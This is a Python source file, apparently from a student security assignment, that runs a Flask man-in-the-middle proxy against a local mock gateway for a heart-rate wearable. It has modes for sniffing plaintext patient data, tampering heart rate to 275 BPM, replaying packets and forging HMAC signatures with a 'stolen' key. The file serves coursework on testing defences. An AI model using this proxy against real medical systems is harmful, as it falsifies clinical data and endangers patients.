"""
attack/attack1_ble.py — LKK owns this file.

Attack Chain Analysis (for CW1 Page 4):
1. Adversary position: Same local network (simulating Bluetooth range), no credentials required.
2. Observation: Traffic is intercepted as plaintext JSON via MITM proxy, exposing patient_id and heart_rate.
3. Mutation: The adversary alters the heart_rate to a medically extreme value (e.g., 275 BPM).
4. Injection: The tampered packet is forwarded to the gateway.
5. Impact: Without defences, the gateway accepts the packet, the cloud stores false clinical data, 
   causing a critical false alarm (or Alert Fatigue) for the medical staff.
"""

import argparse
import requests
import time
import json
import os
import hmac
import hashlib
from flask import Flask, request, jsonify

app = Flask(__name__)

# Configure the target gateway (e.g., LYZ's gateway or your mock gateway)
TARGET_GATEWAY = "http://127.0.0.1:8000/upload"
ATTACK_MODE = "sniff" # Default mode

# Prepare secret key theft logic for A1.4 (Insider Threat)
try:
    from dotenv import load_dotenv
    load_dotenv()
    STOLEN_SECRET = os.environ.get("HMAC_DEVICE_SECRET", "").encode()
except:
    STOLEN_SECRET = b""

@app.route('/upload', methods=['POST'])
def mitm_proxy():
    # Intercept raw data from the wearable
    packet = request.get_json()
    
    print("\n" + "="*50)
    print(f"[A1.1 SNIFF] Intercepted plaintext data: {packet['patient_id']} - HR: {packet['heart_rate']}")
    
    # ---------------------------------------------------------
    # A1.2: Tamper (Modify heart_rate but do not update HMAC)
    # ---------------------------------------------------------
    if ATTACK_MODE == "tamper":
        original_hr = packet["heart_rate"]
        packet["heart_rate"] = 275.0 # Inject dangerous heart rate
        print(f"[A1.2 TAMPER] Modified data! heart_rate {original_hr} -> 275.0")
        # Note: Deliberately do not update hmac_sig to test LYZ's defense

    # ---------------------------------------------------------
    # A1.4: Key-compromise (Forge signature with stolen key, bypass LYZ defense, directly test ZYM AI)
    # ---------------------------------------------------------
    elif ATTACK_MODE == "bypass":
        packet["heart_rate"] = 275.0
        print(f"[A1.4 BYPASS] Modified heart_rate to 275.0, recalculating HMAC using stolen key...")
        packet.pop("hmac_sig", None) # Remove old signature
        to_sign = json.dumps(
            {k: packet[k] for k in ("patient_id", "timestamp", "heart_rate", "nonce")},
            sort_keys=True, separators=(",", ":")
        ).encode()
        packet["hmac_sig"] = hmac.new(STOLEN_SECRET, to_sign, hashlib.sha256).hexdigest()
        print(f"Forged signature: {packet['hmac_sig'][:10]}...")

    # Forward to actual gateway
    print(f"Forwarding to gateway {TARGET_GATEWAY} ...")
    try:
        response = requests.post(TARGET_GATEWAY, json=packet, timeout=2)
        print(f"Gateway response: HTTP {response.status_code} - {response.text.strip()}")
    except Exception as e:
        print(f"Gateway connection failed: {e}")

    # ---------------------------------------------------------
    # A1.3: Replay (Wait 2 seconds, then resend an identical packet)
    # ---------------------------------------------------------
    if ATTACK_MODE == "replay":
        print(f"[A1.3 REPLAY] Preparing replay attack, waiting 2 seconds...")
        time.sleep(2)
        print(f"Resending the exact same packet (same nonce and timestamp)...")
        try:
            response2 = requests.post(TARGET_GATEWAY, json=packet, timeout=2)
            print(f"Gateway second response: HTTP {response2.status_code} - {response2.text.strip()}")
        except Exception as e:
            pass

    # Always return 200 OK to the wearable, so it is unaware of interception
    return jsonify({"status": "intercepted_by_mitm"}), 200

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE MITM Attack Proxy")
    parser.add_argument("--mode", choices=["sniff", "tamper", "replay", "bypass"], default="sniff",
                        help="Attack mode to use")
    args = parser.parse_args()
    
    ATTACK_MODE = args.mode
    print(f"Hacker proxy started | Mode: {ATTACK_MODE.upper()} | Listening on port: 8001")
    app.run(port=8001)